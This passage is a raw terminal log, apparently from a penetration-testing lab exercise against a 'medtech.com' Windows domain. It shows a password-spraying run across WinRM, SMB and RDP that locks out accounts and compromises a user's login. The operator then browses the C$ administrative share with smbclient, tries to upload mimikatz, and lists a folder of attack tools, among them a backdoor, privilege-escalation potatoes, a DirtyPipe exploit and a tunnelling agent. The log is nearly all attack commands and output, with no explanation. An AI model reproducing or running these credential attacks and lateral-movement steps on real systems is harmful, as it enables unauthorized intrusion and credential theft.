+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\Administrator:Mushroom!
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\krbtgt:Mushroom!
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\offsec:Mushroom!
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\yoshi:Mushroom!
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\Guest:Mushroom!
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\leon:Mushroom!
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\peach:Mushroom!
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\joe:Mushroom!
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\mario:Mushroom!
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\wario:Mushroom!
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\Administrator:Flowers1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\krbtgt:Flowers1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\offsec:Flowers1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\yoshi:Flowers1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\Guest:Flowers1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\leon:Flowers1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\peach:Flowers1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\joe:Flowers1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\mario:Flowers1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\wario:Flowers1
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\Administrator:password
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\krbtgt:password
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\offsec:password
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\yoshi:password
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\Guest:password
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\leon:password
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\peach:password
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\joe:password
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\mario:password
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/cry
+pto.py:46: CryptographyDeprecationWarning: ARC4 has
+ been moved to cryptography.hazmat.decrepit.ciphers
+.algorithms.ARC4 and will be removed from cryptogra
+phy.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\wario:password
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\Administrator: SpnegoError (16): O
+peration not supported or available, Context: Retri
+eving NTLM store without NTLM_USER_FILE set to a fi
+lepath
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\krbtgt: SpnegoError (16): Operatio
+n not supported or available, Context: Retrieving N
+TLM store without NTLM_USER_FILE set to a filepath
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\offsec: SpnegoError (16): Operatio
+n not supported or available, Context: Retrieving N
+TLM store without NTLM_USER_FILE set to a filepath
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\yoshi: SpnegoError (16): Operation
+ not supported or available, Context: Retrieving NT
+LM store without NTLM_USER_FILE set to a filepath
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\Guest: SpnegoError (16): Operation
+ not supported or available, Context: Retrieving NT
+LM store without NTLM_USER_FILE set to a filepath
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\leon: SpnegoError (16): Operation
+not supported or available, Context: Retrieving NTL
+M store without NTLM_USER_FILE set to a filepath
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\peach: SpnegoError (16): Operation
+ not supported or available, Context: Retrieving NT
+LM store without NTLM_USER_FILE set to a filepath
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\joe: SpnegoError (16): Operation n
+ot supported or available, Context: Retrieving NTLM
+ store without NTLM_USER_FILE set to a filepath
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\mario: SpnegoError (16): Operation
+ not supported or available, Context: Retrieving NT
+LM store without NTLM_USER_FILE set to a filepath
+[1m[34mWINRM[0m       172.16.174.12   5985   DEV04
+ [1m[31m[-][0m medtech.com\wario: SpnegoError (16): Operation
+ not supported or available, Context: Retrieving NT
+LM store without NTLM_USER_FILE set to a filepath
+[1m[34mSMB[0m         172.16.174.82   445    CLIENT01
+ [1m[34m[*][0m Windows 11 Build 22000 x64 (name:CLIENT01) (do
+main:medtech.com) ([1m[31msigning:False[0m) ([1m[36mSMBv1:None[0m)
+[1m[34mSMB[0m         172.16.174.82   445    CLIENT01
+ [1m[31m[-][0m medtech.com\Administrator:Mushroom! STATUS_LOG
+ON_FAILURE
+[1m[34mSMB[0m         172.16.174.82   445    CLIENT01
+ [1m[31m[-][0m medtech.com\krbtgt:Mushroom! STATUS_ACCOUNT_LO
+CKED_OUT
+[1m[34mSMB[0m         172.16.174.82   445    CLIENT01
+ [1m[31m[-][0m medtech.com\offsec:Mushroom! STATUS_ACCOUNT_LO
+CKED_OUT
+[1m[34mSMB[0m         172.16.174.82   445    CLIENT01
+ [1m[32m[+][0m medtech.com\yoshi:Mushroom! [1m[33m(Pwn3d!)[0m
+[1m[34mRDP[0m         172.16.174.82   3389   CLIENT01
+ [1m[34m[*][0m Windows 10 or Windows Server 2016 Build 22000
+(name:CLIENT01) (domain:medtech.com) ([1m[36mnla:True[0m)
+[1m[34mRDP[0m         172.16.174.82   3389   CLIENT01
+ [1m[31m[-][0m medtech.com\Administrator:Mushroom! (STATUS_LO
+GON_FAILURE)
+[1m[34mRDP[0m         172.16.174.82   3389   CLIENT01
+ [1m[35m[-][0m medtech.com\krbtgt:Mushroom! (STATUS_ACCOUNT_L
+OCKED_OUT)
+[1m[34mRDP[0m         172.16.174.82   3389   CLIENT01
+ [1m[35m[-][0m medtech.com\offsec:Mushroom! (STATUS_ACCOUNT_L
+OCKED_OUT)
+[1m[34mRDP[0m         172.16.174.82   3389   CLIENT01
+ [1m[32m[+][0m medtech.com\yoshi:Mushroom! [1m[33m(Pwn3d!)[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m smbclient -L //172.16.174.82 --user medtech/yos
+hi%Mushroom!
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Adm
+in
+	C$              Disk      Default sh
+are
+	IPC$            IPC       Remote IPC
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 172.16.174.82 failed (Err
+or NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup availab
+le
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m smbclient  //172.16.174.82/C$ --user medtech/yo
+shi%Mushroom!
+Try "help" to get a list of possible commands.
+smb: \> dir
+  $Recycle.Bin                      DHS        0  T
+hu Mar 26 21:14:45 2026
+  $WinREAgent                        DH        0  W
+ed Oct  5 06:41:22 2022
+  Documents and Settings          DHSrn        0  W
+ed Sep 28 23:52:29 2022
+  DumpStack.log.tmp                 AHS    12288  T
+hu Apr 24 00:11:19 2025
+  output.txt                          A     2676  T
+hu Mar 26 18:22:10 2026
+  pagefile.sys                      AHS 738197504
+Thu Apr 24 00:11:19 2025
+  PerfLogs                            D        0  S
+at Jun  5 05:10:48 2021
+  Program Files                      DR        0  W
+ed Oct  5 06:32:09 2022
+  Program Files (x86)                DR        0  S
+at Jun  5 07:37:16 2021
+  ProgramData                       DHn        0  T
+hu Oct  6 00:52:50 2022
+  Recovery                         DHSn        0  T
+hu Oct  6 00:52:53 2022
+  swapfile.sys                      AHS 268435456
+Thu Apr 24 00:11:19 2025
+  System Volume Information         DHS        0  W
+ed Sep 28 23:52:43 2022
+  Users                              DR        0  T
+hu Mar 26 21:14:00 2026
+  Windows                             D        0  T
+hu Nov 10 07:19:40 2022
+		7679231 blocks of siz
+e 4096. 1909713 blocks available
+smb: \> cd C:\Users\Yoshi
+cd \C:\Users\Yoshi\: NT_STATUS_OBJECT_NAME_INVALID
+smb: \> put ~/mimikatz.exe
+~/mimikatz.exe does not exist
+smb: \> exit
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m vim CLIENT01_mimikatz.txt
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m ls ../Temp/
+backdoor.exe                      [1m[32mligolo.exe[0m
+[1m[34mCVE-2022-0847-DirtyPipe-Exploits[0m  privesc.exe
+foothold.exe                      shell.ps1
+GodPotato-NET4.exe                SigmaPotato.exe
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Medtech/Loot[0m]
+└─[1m[34m$[0m exit
